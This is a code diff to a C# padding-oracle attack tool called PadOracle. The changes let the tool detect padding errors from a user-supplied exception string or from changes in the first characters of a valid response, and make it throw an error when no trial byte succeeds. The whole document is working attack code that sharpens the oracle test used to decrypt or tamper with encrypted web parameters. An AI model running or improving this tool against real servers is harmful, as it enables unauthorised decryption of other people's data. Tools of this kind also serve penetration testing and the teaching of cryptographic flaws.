@@ -20,6 +20,8 @@ namespace PadOracle
         public int ParallelThreads { get; set; }
 
         public bool Verbose { get; internal set; }
+        public string ExceptString { get; internal set; }
+        public string FirstFewGood { get; private set; }
 
         public CryptTarget(UrlParser _parser)
         {
@@ -106,7 +108,17 @@ namespace PadOracle
                         var ws = wr.GetResponseStream();
                         StreamReader sr = new StreamReader(ws);
                         string resp = sr.ReadToEnd();
-                        if (resp.ToLower().Contains("paddingexception"))
+                        if (String.IsNullOrEmpty(ExceptString)) {
+                            // We haven't been given an exception string from the user, let's guess from the first few characters of a good response.
+                            if (String.IsNullOrEmpty(FirstFewGood)) {
+                                // We don't have the first few characters - assume THIS is the first good response.
+                                FirstFewGood = resp.Substring(0, Math.Min(30,resp.Length)).ToLower();
+                                return true; // We could just drop through, but here I want to be explicit.
+                            } else if (!resp.ToLower().StartsWith(FirstFewGood))
+                            {
+                                return false;
+                            } // else drop through to return true below.
+                        } else if (resp.ToLower().Contains(ExceptString.ToLower()))
                         {
                             return false;
                         }
@@ -179,6 +191,8 @@ namespace PadOracle
                 byte byTarget = mutatedBlock[j];
                 // Working forwards through the trial set.
 
+                bool succeeded = false;
+
                 foreach (byte trialValue in trialValues)
                 {
                     int i = byTarget ^ trialValue ^ padCount;
@@ -215,8 +229,13 @@ namespace PadOracle
                         }
 
                         // Stop on success.
+                        succeeded = true;
                         break;
                     }
+                }
+                if (!succeeded)
+                {
+                    throw new Exception("I was unable to find a single char that would work");
                 }
 
             }
